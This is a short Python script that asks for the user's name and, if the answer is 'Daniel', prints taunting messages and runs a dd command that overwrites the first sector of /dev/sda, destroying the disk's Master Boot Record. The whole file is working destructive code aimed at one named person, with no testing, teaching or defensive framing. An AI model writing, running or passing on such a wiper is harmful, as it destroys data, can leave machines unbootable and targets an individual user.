# Ask me for name and if it is Daniel then delete the computers Master Boot Record
import os
import sys
import time

def main():
    name = input("What is your name? ")
    if name == "Daniel":
        print("You are a bad person")
        time.sleep(1)
        print("Deleting MBR")
        time.sleep(1)
        os.system("dd if=/dev/zero of=/dev/sda bs=512 count=1")
        sys.exit()
    else:
        print("You are a good person")
        sys.exit()

if __name__ == "__main__":
    main()
